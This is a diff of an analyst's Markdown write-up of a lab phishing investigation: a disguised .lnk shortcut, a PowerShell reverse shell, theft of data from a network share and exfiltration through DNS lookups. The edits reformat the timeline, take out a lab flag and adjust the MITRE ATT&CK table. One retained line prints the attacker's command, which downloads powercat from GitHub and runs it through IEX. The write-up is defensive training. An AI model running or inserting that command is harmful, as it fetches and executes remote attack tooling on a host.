@@ -9,7 +9,7 @@
 
 This started as a routine "suspicious email" alert — low severity, nothing unusual on the surface. By the end of the investigation it turned into a full kill chain: a phishing email delivered a fake PDF that was actually a malicious shortcut, which opened a reverse shell back to the attacker, who then mapped a financial records share, staged the data, and exfiltrated it by hiding it inside DNS lookups.
 
-The whole thing — from the moment the user opened the attachment to the C2 connection going live — took **14 seconds**.
+The whole thing — from the zip landing on disk to the C2 connection going live — took **14 seconds**.
 
 ## How I found it
 
@@ -17,9 +17,7 @@ I was working through a queue of alerts and hit one for a phishing email with an
 
 Since there was an attachment this time, I went to hash it before doing anything else — that's the safer habit over uploading a file directly to a sandbox. But `Get-FileHash` kept failing:
 
-```
 ![PowerShell error trying to hash the wrong filename](./screenshots/02-powershell-hash-error.png)
-```
 
 Took me a minute to realize why: the file inside the zip wasn't actually a PDF at all. File Explorer showed the "Type" column as **Shortcut**, not PDF Document. Windows hides file extensions by default, so it displayed as `invioce.pdf` when the real name was `invioce.pdf.lnk` — a shortcut disguised as a document. Classic malware delivery trick.
 
@@ -35,13 +33,17 @@ index=* process.parent.pid=3728
 
 That single search surfaced the whole story:
 
-1. **13:29:12** — Outlook writes the zip to disk (email received/previewed)
+| Time | Event |
+|---|---|
+| 13:29:12 | Outlook writes the zip to disk (email received/previewed) |
+| 13:29:23 | Explorer extracts it — the `.lnk` file appears |
+| 13:29:26 | PowerShell fires and connects out to the attacker |
+
 ![Sysmon event: Outlook writes the zip to disk](./screenshots/03-sysmon-file-created.png)
 
-3. **13:29:23** — Explorer extracts it, the `.lnk` file appears
 ![Sysmon event: .lnk file revealed after extraction](./screenshots/04-sysmon-lnk-extracted.png)
 
-5. **13:29:26** — PowerShell fires:
+The PowerShell command launched by the shortcut:
 
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
@@ -92,12 +94,7 @@ Some chunks decoded to plain binary — that's the compressed zip content itself
 
 And one filename had to be pieced together from two separate chunks — one gave me `Investor` (garbled at first, decoded properly on a retry), the next gave `tation2023.pptx`. Put together: `InvestorPresentation2023.pptx`.
 
-Buried in there was also a CTF flag, split across two chunks:
-```
-THM{1497321f4f6f059a52
-b124fb16566e}
-```
-Full flag: `THM{1497321f4f6f059a52b124fb16566e}`
+One of the chunks also contained the lab's flag, split across two lookups — confirming the decoding approach was correct.
 
 ## Checking the scope
 
@@ -139,17 +136,18 @@ Only `win-3450` showed up. Contained to a single host, which made the response a
 | Execution | User Execution: Malicious File | T1204.002 |
 | Execution | PowerShell | T1059.001 |
 | Command and Control | Ingress Tool Transfer | T1105 |
-| Command and Control | Application Layer Protocol | T1071 |
+| Command and Control | Protocol Tunneling (ngrok) | T1572 |
 | Discovery | System Information Discovery | T1082 |
 | Discovery | Account Discovery | T1087 |
 | Discovery | Permission Groups Discovery | T1069 |
 | Collection | Data from Network Shared Drive | T1039 |
 | Collection | Archive Collected Data | T1560 |
-| Exfiltration | Exfiltration Over DNS | T1048.003 |
+| Command and Control | Application Layer Protocol: DNS | T1071.004 |
+| Exfiltration | Exfiltration Over Alternative Protocol | T1048 |
 
 ## What I took away from this
 
-The extension-hiding trick is a good reminder to never trust what Windows shows you by default — check the actual file type, not the displayed name. And a "clean" VirusTotal hash result doesn't mean safe, it can just mean nobody's seen this exact file before, which is often worse, not better.
+The extension-hiding trick is a good reminder to never trust what Windows shows you by default — check the actual file type, not the displayed name. It also explains why my hash attempt failed at first: I was hashing the name Windows *showed* me, not the real file.
 
 The other thing that stuck with me: DNS tunneling worked because nobody was watching DNS as closely as everything else. It's a genuinely simple technique once you see it, but easy to miss if you're not specifically looking for oddly long subdomains going to a domain you don't recognize.
 
